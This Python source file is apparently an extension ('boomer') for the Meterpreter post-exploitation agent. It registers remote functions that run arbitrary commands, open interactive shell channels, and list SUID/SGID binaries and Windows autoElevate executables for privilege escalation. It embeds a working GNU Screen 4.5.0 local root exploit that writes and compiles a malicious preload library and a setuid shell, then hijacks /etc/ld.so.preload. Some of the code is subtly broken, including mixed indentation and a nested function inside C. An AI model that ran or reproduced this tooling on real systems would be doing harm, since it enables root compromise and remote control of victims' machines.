#Thanks to ext_server_stdapi.py
#There is still a way to go
#Cleaning and extension...


import fnmatch
import getpass
import os
import platform
import re
import shlex
import shutil
import socket
import struct
import subprocess
import sys
import time
import glob
import stat
from multiprocessing.dummy import Pool

try:
	import ctypes
	import ctypes.util
	has_ctypes = True
	has_windll = hasattr(ctypes, 'windll')
except ImportError:
	has_ctypes = False
	has_windll = False

try:
	import pty
	has_pty = True
except ImportError:
	has_pty = False

try:
	import pwd
	has_pwd = True
except ImportError:
	has_pwd = False

try:
	import termios
	has_termios = True
except ImportError:
	has_termios = False

try:
	import _winreg as winreg
	has_winreg = True
except ImportError:
	has_winreg = False

try:
	import winreg
	has_winreg = True
except ImportError:
	has_winreg = (has_winreg or False)

if sys.version_info[0] < 3:
	is_str = lambda obj: issubclass(obj.__class__, str)
	is_bytes = lambda obj: issubclass(obj.__class__, str)
	bytes = lambda *args: str(*args[:1])
	NULL_BYTE = '\x00'
	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, str) else x)
else:
	if isinstance(__builtins__, dict):
		is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
		str = lambda x: __builtins__['str'](x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
	else:
		is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
		str = lambda x: __builtins__.str(x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
	NULL_BYTE = bytes('\x00', 'UTF-8')
	long = int
	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)


# TLV DEFINITION

#
# TLV Meta Types
#
TLV_META_TYPE_NONE       = (   0   )
TLV_META_TYPE_STRING     = (1 << 16)
TLV_META_TYPE_UINT       = (1 << 17)
TLV_META_TYPE_RAW        = (1 << 18)
TLV_META_TYPE_BOOL       = (1 << 19)
TLV_META_TYPE_QWORD      = (1 << 20)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP      = (1 << 30)
TLV_META_TYPE_COMPLEX    = (1 << 31)
# not defined in original
TLV_META_TYPE_MASK = (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)
# More TLV
TLV_EXTENSIONS           = 20000
TLV_TYPE_PYTHON_RESULT             = TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 8)
TLV_TYPE_PROCESS_PATH              = TLV_META_TYPE_STRING | 2302
TLV_TYPE_PROCESS_HANDLE            = TLV_META_TYPE_QWORD  |  630
TLV_TYPE_PID                       = TLV_META_TYPE_UINT   | 2300
TLV_TYPE_CHANNEL_ID                = TLV_META_TYPE_UINT   | 50

# TLV DEFINITION END

##
# Errors
##
ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1

meterpreter.register_extension('boomer')

# Meterpreter register function decorators
register_function = meterpreter.register_function
def register_function_if(condition):
	if condition:
		return meterpreter.register_function
	else:
		return lambda function: function

# GENERAL FUNCTIONS BEGIN


@register_function
def boomer_start_boomer_console(request, response):
	response += tlv_pack(TLV_TYPE_PYTHON_RESULT, "Bye")
	return ERROR_SUCCESS, response

@register_function
def boomer_check(request, response):
    to_check = packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)['value']
    try:
		argument =  subprocess.Popen(to_check.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
		response += tlv_pack(TLV_TYPE_PYTHON_RESULT, argument)
    except:
        response += tlv_pack(TLV_TYPE_PYTHON_RESULT, "Error")
    return ERROR_SUCCESS, response

@register_function
def boomer_open_channel(request, response):
	cmd = packet_get_tlv(request, TLV_TYPE_PROCESS_PATH)['value']
	args = [cmd]
	if has_pty:
		master, slave = pty.openpty()
		if has_termios:
			settings = termios.tcgetattr(master)
			settings[3] = settings[3] & ~termios.ECHO
			termios.tcsetattr(master, termios.TCSADRAIN, settings)
		proc_h = STDProcess(args, stdin=slave, stdout=slave, stderr=slave, bufsize=0)
		proc_h.stdin = os.fdopen(master, 'wb')
		proc_h.stdout = os.fdopen(master, 'rb')
		proc_h.stderr = open(os.devnull, 'rb')
	else:
		proc_h = STDProcess(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

	proc_h.start()
	proc_h_id = meterpreter.add_process(proc_h)
	response += tlv_pack(TLV_TYPE_PID, proc_h.pid)
	response += tlv_pack(TLV_TYPE_PROCESS_HANDLE, proc_h_id)
	channel_id = meterpreter.add_channel(proc_h)
	response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
	return ERROR_SUCCESS, response

# GENERAL FUNCTIONS END

# LINUX FUNCTIONS BEGIN

@register_function
def exploit_screen45(request, response):
	try:
		treat_files_screen45()
	except:
		response +=  tlv_pack(TLV_TYPE_PYTHON_RESULT, "Error writing files")
		return ERROR_FAILURE, response
	try:
		compile_files_screen45()
	except:
		response +=  tlv_pack(TLV_TYPE_PYTHON_RESULT, "Error compile files")
		return ERROR_FAILURE, response
	response += tlv_pack(TLV_TYPE_PYTHON_RESULT, "Good")
	return ERROR_SUCCESS, response

@register_function
def boomer_suid_sgid(request, response):
	my_dir = packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)['value']
	files_suid = []
	files_sgid = []
	for f in os.listdir(my_dir):
		aux_file = os.path.join(my_dir, f)
        if os.path.isfile(aux_file):
            result = is_suid_sgid(aux_file)
            if result[0]:
                files_suid.append(result[0])
            if result[1]:
                files_sgid.append(result[1])
	files_suid = ";".join(files_suid)
	files_sgid = ";".join(files_sgid)
	files = files_suid + "++" + files_sgid
	response += tlv_pack(TLV_TYPE_PYTHON_RESULT, files)
	return ERROR_SUCCESS, response

# LINUX FUNCTIONS END

# AUXILIAR LINUX FUNCTIONS
def treat_files_screen45():
	libhax = open("/tmp/libhax.c", "w")
	libhax.write('''
        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        __attribute__ ((__constructor__))
        void dropshell(void){
            chown("/tmp/shell", 0, 0);
            chmod("/tmp/shell", 04755);
            uid_t getuid(void){
                return 0;
            }
            
        }
        ''')
	libhax.close()
	shell = open("/tmp/shell.c", "w")
	shell.write('''
            #include <stdio.h>
            int main(void){
              unlink("/etc/ld.so.preload");
              execvp("/bin/sh", NULL, NULL);
            }
            ''')
	shell.close()

def compile_files_screen45():
	os.popen("""
        screen -D -m gcc -shared -ldl -o /tmp/libhax.so /tmp/libhax.c 2> /dev/null;
        screen -D -m gcc -z execstack -o /tmp/shell /tmp/shell.c 2> /dev/null;
        rm -f /tmp/shell.c; rm -f /tmp/libhax.c
        """)
	os.popen('''
        umask 0;
        screen -D -m -q -L /etc/ld.so.preload echo -ne  "/tmp/libhax.so";
        ''')
	time.sleep(3)
	os.system("screen -lsq 2>&1 >/dev/null")


def is_suid_sgid(file_name):
    results = []
    try:
        f = os.stat(file_name)
        mode = f.st_mode
    except:
        return [None, None]
    if (mode & stat.S_ISUID) == 2048:
        results.append(file_name)
    else:
        results.append(None)

    if (mode & stat.S_ISGID) == 1024:
        results.append(file_name)
    else:
        results.append(None)

    return results

# AUXILIAR LINUX FUNCTIONS END

# WINDOWS FUNCTIONS BEGIN

@register_function
def boomer_auto_elevate(request, response):
	files_auto = [] 
	try:
		my_path = packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)['value']
		for b, d, f in os.walk(my_path):
			f_exe = glob.glob(b + os.sep + "*exe")
			for new_file in f_exe:
				if check_auto_elevate_aux(new_file):
					files_auto.append(new_file)
	except:
		pass
	files_auto = ";".join(files_auto)
	response += tlv_pack(TLV_TYPE_PYTHON_RESULT, files_auto)
	return ERROR_SUCCESS, response

# WINDOWS FUNCTIONS END

# AUXILIAR WINDOWS FUNCTIONS BEGIN

def check_auto_elevate_aux(pt):
	try:
		f = open(pt,'rb')
		if b"<autoElevate>true</autoElevate>" in f.read():
			return True 
		return False           
	except:
		return False

# AUXILIAR WINDOWS FUNCTIONS END